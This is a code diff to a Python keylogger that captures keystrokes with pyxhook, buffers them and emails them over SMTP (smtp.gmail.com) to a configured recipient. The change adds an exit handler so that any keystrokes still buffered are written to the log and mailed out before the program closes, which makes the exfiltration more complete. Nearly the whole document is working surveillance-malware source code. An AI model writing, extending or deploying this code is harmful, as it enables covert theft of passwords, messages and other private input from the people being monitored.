@@ -1,14 +1,14 @@
 import argparse
 import datetime
-
-import pyxhook
-import time
+import logging
 import smtplib
 import threading
-import logging
-
-from email.mime.text import MIMEText
+import time
 from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import atexit
+
+import pyxhook
 
 # Setup application logging
 logging.basicConfig(level=logging.DEBUG)
@@ -40,6 +40,8 @@ smtp_server = 'smtp.gmail.com'
 smtp_login = ''
 smtp_password = ''
 send_mail_to = ''
+# timeout seconds
+send_smtp_job_timeout = 10
 
 
 #
@@ -122,7 +124,7 @@ def save_to_log(filename, data):
 #
 #   Using for buffering before send mail
 #
-def update_chunk_buffer(data):
+def update_chunk_buffer(data, force=False):
     global chunk_buffer, chunk_buffer_size
     global smtp_login, smtp_password, smtp_server, send_mail_to
 
@@ -130,15 +132,17 @@ def update_chunk_buffer(data):
 
     chunk_buffer += data
 
-    if len(chunk_buffer) >= chunk_buffer_size:
-        SendMailJob(smtp_server, smtp_login, smtp_password, send_mail_to, chunk_buffer).start()
+    if len(chunk_buffer) >= chunk_buffer_size or force:
+        send_mail_job = SendMailJob(smtp_server, smtp_login, smtp_password, send_mail_to, chunk_buffer)
         chunk_buffer = ''
+        send_mail_job.start()
+        return send_mail_job
 
 
 #
 #   Using for buffering before store into log file and updating chunk buffer
 #
-def update_keys_buffer(key):
+def update_keys_buffer(key, force=False):
     global args
     global keys_buffer, keys_buffer_size
 
@@ -146,7 +150,7 @@ def update_keys_buffer(key):
 
     keys_buffer += key
 
-    if len(keys_buffer) >= keys_buffer_size:
+    if len(keys_buffer) >= keys_buffer_size or force:
         keys_buffer += "\n"
 
         # Save to log file
@@ -191,10 +195,23 @@ def stop():
     hookman.cancel()
 
 
+#
+#   Application exit handler
+#
+def exit_handler():
+    global send_smtp_job_timeout
+
+    # store all buffers before exit
+    update_keys_buffer('', True)
+    update_chunk_buffer('', True).join(send_smtp_job_timeout)
+
+
 def main():
     global running, args
 
     args = cli()
+
+    atexit.register(exit_handler)
 
     catching_keyboard()
 
